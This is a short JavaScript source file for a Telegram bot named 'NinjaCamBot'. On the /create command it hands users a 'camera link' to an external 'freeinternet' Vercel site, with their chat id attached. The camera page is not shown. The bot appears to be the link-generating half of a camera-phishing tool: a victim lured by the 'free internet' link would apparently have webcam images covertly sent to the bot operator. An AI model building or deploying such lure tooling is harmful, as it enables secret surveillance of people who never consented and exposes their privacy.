import TelegramBot from "node-telegram-bot-api";

const BOT_TOKEN = process.env.BOT_TOKEN; 
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

console.log("🚀 Bot is Running via Railway (No Webhook Needed)");

bot.on("message", async (msg) => {
  const chat_id = msg.chat.id;
  const text = msg.text;

  // /start
  if (text === "/start") {
    return bot.sendMessage(chat_id,
`👋 Welcome to NinjaCamBot (Railway Mode)
Use /create to get your camera link.`);
  }

  // /create
  if (text === "/create") {
    const baseUrl = "https://freeinternet-seven.vercel.app"; // তোমার সাইট
    const link = `${baseUrl}/?chatid=${chat_id}`;

    return bot.sendMessage(chat_id,
`🎯 Your Camera Link:
🔗 ${link}

Open it and wait 5 seconds ✅`, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "Open Link ✅", url: link }]
        ]
      }
    });
  }

  // Other Text
  bot.sendMessage(chat_id, "⚡ Command List:\n/start\n/create");
});